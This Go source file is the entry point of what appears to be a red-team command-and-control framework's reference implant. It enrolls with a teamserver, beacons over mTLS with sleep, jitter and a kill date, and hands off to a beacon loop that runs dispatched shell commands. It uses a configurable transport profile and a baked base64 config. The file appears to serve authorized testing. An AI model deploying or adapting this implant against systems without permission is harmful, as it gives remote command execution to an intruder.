// Command rod-implant is the reference Go stage-2 implant (roadmap M3.2). It
// enrolls into an engagement, opens the mTLS beacon stream, and runs the core
// capability verbs the teamserver dispatches (architecture.md Sec 5).
//
// This is a benign reference implant: it enrolls over the teamserver's HTTP
// enroll endpoint, beacons over mTLS, and shells out for the single core verb
// shell.exec. It performs no evasion, no obfuscation, no persistence, and no
// destructive behavior (RESPONSIBLE-USE.md, architecture.md Sec 7). It exists to
// prove the end-to-end slice -- enroll, beacon, task -- against the real
// teamserver and to give the Go build unit something real to compile.
package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/cw/rod/implant/internal/beacon"
	"github.com/cw/rod/implant/internal/c2"
	"github.com/cw/rod/implant/internal/config"
)

func main() {
	// A profile baked in at build time (ldflags) seeds the defaults; explicit
	// flags and env still win over it, so an operator can override at run time.
	seedFromBaked()
	cfg, err := config.Parse(os.Args[1:])
	if err != nil {
		// A flag parse error or -h has already been reported by the flag set.
		os.Exit(2)
	}
	logger := log.New(os.Stderr, "rod-implant: ", log.LstdFlags|log.Lmsgprefix)

	if !cfg.KillDate.IsZero() && time.Now().After(cfg.KillDate) {
		logger.Fatalf("kill date %s has passed; refusing to run", cfg.KillDate.Format(time.RFC3339))
	}

	// The implant owns its private key; only the public half crosses enroll
	// (architecture.md Sec 9). 2048-bit RSA matches the dev CA's leaf key size.
	logger.Print("generating implant keypair")
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		logger.Fatalf("generate key: %v", err)
	}

	serverCAs, err := loadCAs(cfg.CACertPath)
	if err != nil {
		logger.Fatalf("load CA: %v", err)
	}

	// The malleable transport profile (architecture.md Sec 7, M4.3) shapes the
	// enroll request: a profiled enroll path, User-Agent, custom headers, a
	// per-request timeout, and an optional base64 body envelope. Built from the
	// config (flag/env/baked) and applied by the enroll client.
	transport := c2.TransportProfile{
		UserAgent:      cfg.Transport.UserAgent,
		Headers:        cfg.Transport.Headers,
		RequestTimeout: cfg.Transport.RequestTimeout,
		Envelope:       envelopeFromString(cfg.Transport.Envelope),
	}
	enrollURL := cfg.ResolvedEnrollURL()
	logger.Printf("enrolling at %s", enrollURL)
	enrollment, err := c2.Enroll(enrollURL, cfg.StagerToken, privateKey, serverCAs, transport)
	if err != nil {
		logger.Fatalf("enroll: %v", err)
	}
	logger.Printf("enrolled: implant=%s engagement=%s", enrollment.ImplantID, enrollment.EngagementID)

	beaconURL := cfg.BeaconURL
	if beaconURL == "" {
		beaconURL = beaconURLFromEnroll(cfg.EnrollURL)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	b := beacon.New(beaconURL, enrollment.ImplantID, enrollment.Leaf, enrollment.CAs, cfg.Sleep, cfg.Jitter, cfg.KillDate, logger)
	if err := b.Run(ctx); err != nil && !errors.Is(err, context.Canceled) {
		logger.Fatalf("beacon: %v", err)
	}
}

// loadCAs loads an optional PEM-encoded CA bundle from a file path; the implant
// pins it as the teamserver identity for the enroll TLS connection. An empty
// path returns a nil pool (system roots / trust the chain returned at enroll).
func loadCAs(path string) (*x509.CertPool, error) {
	if path == "" {
		return nil, nil
	}
	pemBytes, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read CA file: %w", err)
	}
	block, _ := pem.Decode(pemBytes)
	if block == nil {
		return nil, errors.New("CA cert is not valid PEM")
	}
	cert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return nil, err
	}
	pool := x509.NewCertPool()
	pool.AddCert(cert)
	return pool, nil
}

// beaconURLFromEnroll derives the beacon URL (host:port) from the enroll URL by
// stripping the /implants/enroll path. Lets the operator pass a single endpoint.
func beaconURLFromEnroll(enrollURL string) string {
	u := enrollURL
	for _, suffix := range []string{"/implants/enroll", "/implants/enroll/"} {
		if len(u) >= len(suffix) && u[len(u)-len(suffix):] == suffix {
			u = u[:len(u)-len(suffix)]
			break
		}
	}
	return u
}

// seedFromBaked applies the build-time baked profile as the defaults for any
// config field the operator did not supply via flag or env. The baked value is
// base64-URL JSON (the build unit sets it via ldflags). Malformed baked data is
// ignored -- a bad bake must not crash the implant, it just falls back to
// flag/env.
func seedFromBaked() {
	if bakedJSON == "" {
		return
	}
	raw, err := base64.URLEncoding.DecodeString(bakedJSON)
	if err != nil {
		raw, err = base64.StdEncoding.DecodeString(bakedJSON)
		if err != nil {
			return
		}
	}
	// The baked JSON mixes scalar string values with a nested "headers" object;
	// decode into RawMessage so the nested object can be re-emitted as the
	// ROD_HEADERS JSON-object string config.Parse expects.
	var baked map[string]json.RawMessage
	if err := json.Unmarshal(raw, &baked); err != nil {
		return
	}
	// Map baked scalar keys to the same ROD_* env names config.Parse reads; only
	// set env when it is not already present, so an explicit env always wins over
	// the bake.
	envMap := map[string]string{
		"enrollURL":      "ROD_ENROLL_URL",
		"beaconURL":      "ROD_BEACON_URL",
		"token":          "ROD_STAGER_TOKEN",
		"sleep":          "ROD_SLEEP",
		"jitter":         "ROD_JITTER",
		"killDate":       "ROD_KILL_DATE",
		"enrollPath":     "ROD_ENROLL_PATH",
		"userAgent":      "ROD_USER_AGENT",
		"requestTimeout": "ROD_REQUEST_TIMEOUT",
		"envelope":       "ROD_ENVELOPE",
	}
	for jsonKey, envKey := range envMap {
		if msg, ok := baked[jsonKey]; ok && os.Getenv(envKey) == "" {
			var v string
			if err := json.Unmarshal(msg, &v); err == nil && v != "" {
				os.Setenv(envKey, v)
			}
		}
	}
	// Headers ride as a nested object; re-emit the raw JSON verbatim into
	// ROD_HEADERS, which config.Parse decodes back into the header map.
	if msg, ok := baked["headers"]; ok && os.Getenv("ROD_HEADERS") == "" {
		var headers map[string]string
		if err := json.Unmarshal(msg, &headers); err == nil && len(headers) > 0 {
			os.Setenv("ROD_HEADERS", string(msg))
		}
	}
}

// envelopeFromString maps the profile's lowercase envelope name to the c2
// envelope value. "base64" wraps the enroll body; anything else (including the
// empty default) sends raw JSON.
func envelopeFromString(s string) c2.Envelope {
	if strings.EqualFold(s, "base64") {
		return c2.EnvelopeBase64
	}
	return c2.EnvelopeNone
}
